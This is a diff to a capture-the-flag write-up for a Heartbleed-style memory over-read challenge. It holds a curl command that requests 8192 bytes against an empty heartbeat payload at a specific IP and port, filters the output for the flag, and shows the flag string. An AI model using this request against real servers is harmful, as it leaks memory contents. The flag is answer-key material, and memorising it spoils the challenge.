@@ -48,10 +48,12 @@ Notes:
 - Filter output for keywords like `GCTF`, `flag`, `ctf`.
 
 ```bash
-curl -s http://host:port/heartbeat -H "Content-Type: application/json" -d '{"payload":"","length":8192}' | grep -iE "flag|ctf|gctf"
+curl -s http://188.166.183.187:34886/heartbeat -H "Content-Type: application/json" -d '{"payload":"","length":8192}' | strings | grep -iE "flag|ctf|gctf"
 ```
 
 ## Flag
+
+<img width="1136" height="94" alt="image" src="https://github.com/user-attachments/assets/4a5f84a9-c93e-495f-92c6-20dbd69e0104" />
 
 ```flag
 GCTF25{aK4mI_H3ARTY_tl$SU3_saD_so_$AD_c1737cad162e}
